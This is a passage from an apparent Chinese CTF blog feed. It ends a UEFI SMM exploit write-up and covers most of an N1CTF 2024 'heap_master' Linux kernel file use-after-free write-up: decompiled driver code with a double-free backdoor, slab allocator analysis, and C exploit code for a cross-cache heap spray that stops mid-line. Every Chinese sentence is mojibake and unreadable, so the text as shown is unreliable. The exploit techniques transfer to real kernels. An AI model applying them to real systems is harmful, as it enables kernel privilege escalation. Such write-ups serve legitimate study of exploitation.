class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2024/12/14/uefi/28.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç®€å•å­¦ä¹ äº†ä¸€ä¸‹ UEFI SSM çš„æ¼æ´ç±»å‹å’Œæ”»å‡»æ–¹å¼ï¼Œå¯¹ UEFI å›ºä»¶æ¼æ´æŒ–æ˜åˆ©ç”¨æœ‰äº†æ›´åŠ æ·±åˆ»çš„è®¤è¯†ï¼Œæ‰¾ä¸ªæ—¶é—´å†æ‰¾äº›å®é™…å­˜åœ¨çš„æ¼æ´å®æ“ä¸€ä¸‹ğŸ˜‹ã€‚  </p><h2 id="å­¦ä¹ çš„æ–‡ç« "><a href="#å­¦ä¹ çš„æ–‡ç« " class="headerlink" title="å­¦ä¹ çš„æ–‡ç« "></a>å­¦ä¹ çš„æ–‡ç« </h2><p><a href="https://xiananren.github.io/2024/08/23/UEFI%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://xiananren.github.io/2024/08/23/UEFI%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a><br><a href="https://www.cnblogs.com/L0g4n-blog/p/17369864.html">https://www.cnblogs.com/L0g4n-blog/p/17369864.html</a><br><a href="https://www.sentinelone.com/labs/zen-and-the-art-of-smm-bug-hunting-finding-mitigating-and-detecting-uefi-vulnerabilities/">https://www.sentinelone.com/labs/zen-and-the-art-of-smm-bug-hunting-finding-mitigating-and-detecting-uefi-vulnerabilities/</a><br><a href="https://www.binarly.io/advisories/brly-2021-007">https://www.binarly.io/advisories/brly-2021-007</a><br><a href="https://xiananren.github.io/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/">https://xiananren.github.io/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/</a><br><a href="https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/">https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux file uaf</title>
      <link href="/2024/11/12/fileuaf/"/>
      <url>/2024/11/12/fileuaf/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨ä¸€åˆ‡ä¹‹å‰"><a href="#å†™åœ¨ä¸€åˆ‡ä¹‹å‰" class="headerlink" title="å†™åœ¨ä¸€åˆ‡ä¹‹å‰"></a>å†™åœ¨ä¸€åˆ‡ä¹‹å‰</h2><p>è¿™ä¸ªå‘¨æœ«æ‰“äº† N1CTFï¼Œä¸å¾—ä¸è¯´ N1CTF çš„é¢˜ç›®è´¨é‡æ˜¯çœŸçš„é«˜ï¼Œä¸‹æ¬¡å‡ºé¢˜æˆ‘ä¹Ÿè¦å‡ºå¥½ä¸€ç‚¹ï¼ˆå…¶å®å·²ç»å‡ºå¥½äº†ï¼Œä¸è¿‡æ‰“ç®—èŠ±å¤šç‚¹æ—¶é—´å»ä¼˜åŒ–ğŸ˜‹ğŸ˜‹ï¼Œæ•¬è¯·æœŸå¾…ï¼‰ã€‚è¿™æ¬¡æ¯”èµ›æœ‰ä¸¤é¢˜æˆ‘è§‰å¾—éå¸¸æœ‰æ„æ€ï¼Œä¸€é¢˜æ˜¯ heap_masterï¼Œå¦å¤–ä¸€é¢˜æ˜¯ php_masterã€‚å…¶ä¸­ php_master å½“æ—¶å¹¶æ²¡æœ‰åšå‡ºæ¥ï¼Œæ‰“ç®—ä»¥åæœ‰æ—¶é—´å†ç ”ç©¶ä¸€ä¸‹ï¼ˆå‡ºé¢˜äººçš„é¢„æœŸè§£æ˜¯æ‹¿åˆ°ä»»æ„ååºåˆ—åŒ–ï¼Œå¯æ˜¯æœ‰çš„å¸ˆå‚…è®¤ä¸ºè¿™é“é¢˜ç›®å…¶å®å¯ä»¥æ‹¿åˆ° code execï¼‰ï¼Œæ„Ÿè§‰å¦‚ä½•çªç ´ php æ–°åŠ çš„ shadow heap å°†ä¼šæ˜¯ä¸€ä¸ªçƒ­ç‚¹ã€‚è¿™ç¯‡åšå®¢ä¸»è¦æ˜¯å€Ÿ N1CTF heap_master è¿™é¢˜æ¥è®²è®² linux å†…æ ¸ä¸­çš„ file uaf æ¼æ´åˆ©ç”¨æ–¹å¼</p><h2 id="Dirty-PageTable-in-file-uaf"><a href="#Dirty-PageTable-in-file-uaf" class="headerlink" title="Dirty PageTable in file uaf"></a>Dirty PageTable in file uaf</h2><p>è¿™é‡Œä½¿ç”¨çš„ç¯å¢ƒæ˜¯ N1CTF 2024 heap_masterã€‚</p><h3 id="å‰ç½®å†…å®¹"><a href="#å‰ç½®å†…å®¹" class="headerlink" title="å‰ç½®å†…å®¹"></a>å‰ç½®å†…å®¹</h3><p>æˆ‘ä»¬éƒ½çŸ¥é“å†…æ ¸å¯¹ç‰©ç†å†…å­˜çš„ç®¡ç†æ˜¯æŒ‰ç…§é¡µä¸ºåŸºæœ¬å•ä½è¿›è¡Œçš„ï¼Œè¿›ç¨‹è¿è¡Œèµ·æ¥æ‰€éœ€è¦çš„æ•°æ®ä¹Ÿæ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªä¸€ä¸ªçš„ç‰©ç†é¡µä¸­ï¼Œæ—¢ç„¶ç‰©ç†å†…å­˜é¡µå¯ä»¥å­˜å‚¨è¿›ç¨‹çš„æ™®é€šæ•°æ®ï¼Œé‚£ä¹ˆå®ƒä¹Ÿä¸€å®šå¯ä»¥å­˜å‚¨è¿›ç¨‹è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚</p><p>äº‹å®ä¸Šï¼Œå†…æ ¸ä¹Ÿæ˜¯è¿™ä¹ˆå¹²çš„ï¼Œå†…æ ¸ä¼šä»ç‰©ç†å†…å­˜ç©ºé—´ä¸­æ‹¿å‡ºä¸€ä¸ªç‰©ç†å†…å­˜é¡µæ¥ä¸“é—¨å­˜å‚¨è¿›ç¨‹é‡Œçš„è¿™äº›å†…å­˜æ˜ å°„å…³ç³»ï¼Œè€Œè¿™ç§ç‰©ç†å†…å­˜é¡µæˆ‘ä»¬å°†å…¶ç§°ä¹‹ä¸ºé¡µè¡¨ï¼Œä»è¿™é‡Œå¯ä»¥çœ‹å‡ºé¡µè¡¨çš„æœ¬è´¨å…¶å®å°±æ˜¯ä¸€ä¸ªç‰©ç†å†…å­˜é¡µã€‚</p><p>è€Œå†…æ ¸ä¼šåœ¨é¡µè¡¨ä¸­åˆ’åˆ†å‡ºæ¥ä¸€ä¸ªä¸ªå¤§å°ç›¸ç­‰çš„å°å†…å­˜å—ï¼Œè¿™äº›å°å†…å­˜å—æˆ‘ä»¬ç§°ä¹‹ä¸ºé¡µè¡¨é¡¹ PTEï¼ˆPage Table Entryï¼‰ï¼Œæ­£æ˜¯è¿™ä¸ª PTE ä¿å­˜äº†è¿›ç¨‹è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­çš„è™šæ‹Ÿé¡µä¸ç‰©ç†å†…å­˜é¡µçš„æ˜ å°„å…³ç³»ï¼Œä»¥åŠæ§åˆ¶ç‰©ç†å†…å­˜è®¿é—®çš„ç›¸å…³æƒé™ä½ã€‚</p><p>å› ä¸ºå†…å­˜æ˜ å°„çš„ç²’åº¦æ˜¯æŒ‰ç…§é¡µä¸ºå•ä½è¿›è¡Œçš„ï¼Œæ‰€ä»¥è¿›ç¨‹è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­çš„æ¯ä¸ªè™šæ‹Ÿé¡µåœ¨é¡µè¡¨ä¸­éƒ½ä¼šæœ‰ä¸€ä¸ª PTE ä¸ä¹‹å¯¹åº”ï¼Œè€Œè™šæ‹Ÿé¡µèƒŒåæ˜ å°„çš„ç‰©ç†å†…å­˜é¡µçš„èµ·å§‹åœ°å€å°±ä¿å­˜åœ¨ PTE ä¸­ã€‚PTE å°†ä¼šåœ¨æˆ‘ä»¬åç»­çš„æ”»å‡»ä¸­æ‰®æ¼”é‡è¦çš„è§’è‰²ã€‚</p><img src="/2024/11/12/fileuaf/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h3 id="æ¼æ´åˆ†æä¸åˆ©ç”¨"><a href="#æ¼æ´åˆ†æä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ†æä¸åˆ©ç”¨"></a>æ¼æ´åˆ†æä¸åˆ©ç”¨</h3><p>ç”±äºä»£ç é‡æ¯”è¾ƒå°‘ï¼Œè¿™é‡Œç›´æ¥è´´ä¸Š ida çš„å¤–ä»£ç </p><p>safenote_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">safenote_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v0 = misc_register(&amp;safenote_device);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2B1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = kmem_cache_create(<span class="string">&quot;safenote&quot;</span>, <span class="number">0xC0</span>LL, <span class="number">0LL</span>, <span class="number">0x4052000</span>LL, <span class="number">0LL</span>);</span><br><span class="line">    note_kcache = (kmem_cache *)v1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(<span class="type">unsigned</span> __int16 *)(v1 + <span class="number">0x34</span>);</span><br><span class="line">      *(_DWORD *)(v1 + <span class="number">0x2C</span>) = <span class="number">0x34</span>;</span><br><span class="line">      *(_DWORD *)(v1 + <span class="number">0x30</span>) = (v2 + <span class="number">0x67</span>) / v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v0 = <span class="number">-12</span>;</span><br><span class="line">      printk(&amp;unk_308);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_open</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">safenote_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( already_open )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFF0</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))safenote_open_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">safenote_ioctl</span><span class="params">(file *f, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">u_int32_t</span> heap_idx; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;ioc_arg, v3, <span class="number">4LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1338</span> )                          <span class="comment">// free</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      kfree();</span><br><span class="line">      note[ioc_arg.heap_idx] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1339</span> )                          <span class="comment">// uaf</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !backdoor_used &amp;&amp; ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      kfree();</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">      backdoor_used = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    heap_idx = ioc_arg.heap_idx;</span><br><span class="line">    <span class="keyword">if</span> ( ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> &amp;&amp; !note[ioc_arg.heap_idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      note[heap_idx] = (<span class="type">char</span> *)kmem_cache_alloc(note_kcache, <span class="number">0x400CC0</span>LL, ioc_arg.heap_idx);</span><br><span class="line">      <span class="keyword">if</span> ( note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-12LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_close</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">safenote_close</span><span class="params">(inode *inodep, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inodep, filp);</span><br><span class="line">  --already_open;</span><br><span class="line">  printk(&amp;unk_297);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§å‡ºé¢˜äººè‡ªå·±åˆ›å»ºäº†ä¸€ä¸ª kmem_cache å¹¶ä¸”åé¢çš„èœå•å †éƒ½ä¼šä»è¯¥ kmem_cache ä¸­ç”³è¯· objectï¼Œè€Œä¸”é¢˜ç›®ç™½ç»™äº†ä¸€æ¬¡ double free çš„æœºä¼šã€‚æ ¹æ®ç»éªŒï¼Œæˆ‘ä»¬è‡ªç„¶è€Œç„¶çš„å°±ä¼šæƒ³åˆ°ç¬¬ä¸€æ­¥è¦å…ˆè®© uaf çš„ object å¯¹åº”çš„ slab è¿›å…¥åˆ° cross cache ä¸­ï¼Œè‡³äºè¦æ€ä¹ˆè¿›ä¸‹é¢è¿™ç¯‡æ–‡ç« å·²ç»å†™çš„éå¸¸æ¸…æ¥šï¼Œè¿™é‡Œä¸å†èµ˜ï¼š<a href="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/">Cross Cache AttackæŠ€æœ¯ç»†èŠ‚åˆ†æ</a></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ºé¢˜äººä¸ºè¿™ä¸ªæ–°çš„ kmem_cache è‡ªå®šä¹‰äº†  cpu_partial  å’Œ cpu_partial_slabs çš„å€¼</p><img src="/2024/11/12/fileuaf/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * slab info notecache</span><br><span class="line"> * order: 0, object_size: 192</span><br><span class="line"> * cpu_partial: 52</span><br><span class="line"> * objs_per_slab: 16</span><br><span class="line"> * cpu_partial_slabs: 7</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° cpu_partial çš„å€¼å˜å¾—éå¸¸çš„å¤§ï¼Œå¦‚æœæˆ‘ä»¬è¦ç”¨ä¸Šé¢é“¾æ¥é‚£ä¸ªåšæ³•è‡³å°‘éœ€è¦ç”³è¯· <code>2*objs_per_slab*(cpu_partial+1) = 0x6a0</code> ä¸ªå †å—ï¼Œè€Œåœ¨èœå•å †ä¸­æˆ‘ä»¬æœ€å¤šåŒæ—¶æ‹¥æœ‰ 0x100 ä¸ªå †å—ï¼Œæ‰€ä»¥ä¸Šæ–‡çš„æ–¹æ³•åœ¨è¿™é‡Œæ˜¯è¡Œä¸é€šçš„ï¼Œå¯æ˜¯è¿™é‡Œæœ‰ä¸ªéé¢„æœŸ ğŸ˜‹ã€‚</p><p>æˆ‘ä»¬å‘ç°è¿™é“é¢˜ç›®çš„ kernel ç‰ˆæœ¬ä¸º 6.1.110</p><img src="/2024/11/12/fileuaf/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æˆ‘ä»¬æŸ¥çœ‹å½“å‰ç‰ˆæœ¬çš„ put_cpu_partial å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cpu_partial</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab, <span class="type">int</span> drain)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">oldslab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab_to_unfreeze</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="type">int</span> slabs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">oldslab = this_cpu_read(s-&gt;cpu_slab-&gt;partial);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oldslab) &#123;</span><br><span class="line"><span class="keyword">if</span> (drain &amp;&amp; oldslab-&gt;slabs &gt;= s-&gt;cpu_partial_slabs) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Partial array is full. Move the existing set to the</span></span><br><span class="line"><span class="comment"> * per node partial list. Postpone the actual unfreezing</span></span><br><span class="line"><span class="comment"> * outside of the critical section.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab_to_unfreeze = oldslab;</span><br><span class="line">oldslab = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">slabs = oldslab-&gt;slabs;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slabs++;</span><br><span class="line"></span><br><span class="line">slab-&gt;slabs = slabs;</span><br><span class="line">slab-&gt;next = oldslab;</span><br><span class="line"></span><br><span class="line">this_cpu_write(s-&gt;cpu_slab-&gt;partial, slab);</span><br><span class="line"></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab_to_unfreeze) &#123;</span><br><span class="line">__unfreeze_partials(s, slab_to_unfreeze);</span><br><span class="line">stat(s, CPU_PARTIAL_DRAIN);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å½“å‰ç‰ˆæœ¬çš„å†…æ ¸åˆ¤æ–­ slab æ˜¯å¦è¦è¢« buddy system å›æ”¶æ˜¯ä¸ cpu_partial_slabs è¿›è¡Œæ¯”è¾ƒè€Œä¸æ˜¯ cpu_partialï¼Œè€Œ cpu_partial_slabs åœ¨å½“å‰ç¯å¢ƒé‡Œçš„å€¼ä¸º 7ï¼Œæ‰€ä»¥æˆ‘ä»¬å®Œå…¨å¯ä»¥ç›´æ¥å–· 7 ä¸ªé¡µçš„å †å—ï¼ˆæˆ‘å–·äº†12ä¸ªï¼‰ç„¶åç”³è¯·å‡º uaf çš„å †å—æœ€åå†ä»å¤´ä¾æ¬¡é‡Šæ”¾æ‰€æœ‰ç”³è¯·å‡ºæ¥çš„å †å—å°±èƒ½è®© uaf çš„å †å—å¯¹åº”çš„ slab ç»™ buddy system å›æ”¶ï¼Œæˆ‘çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> uaf_index = <span class="number">0xc0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">    add(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == uaf_index)&#123;</span><br><span class="line">        uaf(uaf_index);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    del(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œå‡ºé¢˜äººçš„é¢„æœŸè§£ä¸ºï¼šåœ¨ä¸åŒçš„ CPU ä¸Šæ‰§è¡Œæ·»åŠ å’Œé‡Šæ”¾æ“ä½œã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨ CPU0 ä¸Šè¿›è¡Œåˆ†é…ï¼Œç„¶ååœ¨ CPU1 ä¸Šé‡Šæ”¾ã€‚ç”±äº CPU0 æ— æ³•è®¿é—®ç”± CPU1 ç®¡ç†çš„ freelist æˆ– partial slabsï¼Œè¿™ä¿ƒä½¿ CPU1 è¾¾åˆ°å…¶ partial é˜ˆå€¼ï¼Œè§¦å‘ put_cpu_partialã€‚</p><p>å…¶å®ç°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> safe_note_objs_per_slab = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">bind_core(<span class="number">0</span>);</span><br><span class="line">info(<span class="string">&quot;dev_fd = %d&quot;</span>, dev_fd);</span><br><span class="line">info(<span class="string">&quot;allocate in cpu 0&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; safe_note_objs_per_slab; i++)&#123;</span><br><span class="line">add(i);</span><br><span class="line"><span class="keyword">if</span>(i == safe_note_objs_per_slab / <span class="number">2</span>)&#123;</span><br><span class="line">info(<span class="string">&quot;allocate at note[0]&quot;</span>);</span><br><span class="line">add(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;trigger backdoor int cpu 1 at note[0]&quot;</span>);</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br><span class="line">uaf(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; safe_note_objs_per_slab; i++)&#123;</span><br><span class="line">del(i);</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;Trigger done...&quot;</span>);</span><br><span class="line">info(<span class="string">&quot;Try to Spray at different cpu_slab to cross cache&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">bind_core(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; NOTE_SIZE; j++)&#123;</span><br><span class="line">add(j);</span><br><span class="line">&#125;</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; NOTE_SIZE; j++)&#123;</span><br><span class="line">del(j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;Spray done...&quot;</span>);</span><br><span class="line">info(<span class="string">&quot;Try to cross cache to file&quot;</span>);</span><br><span class="line">bind_core(<span 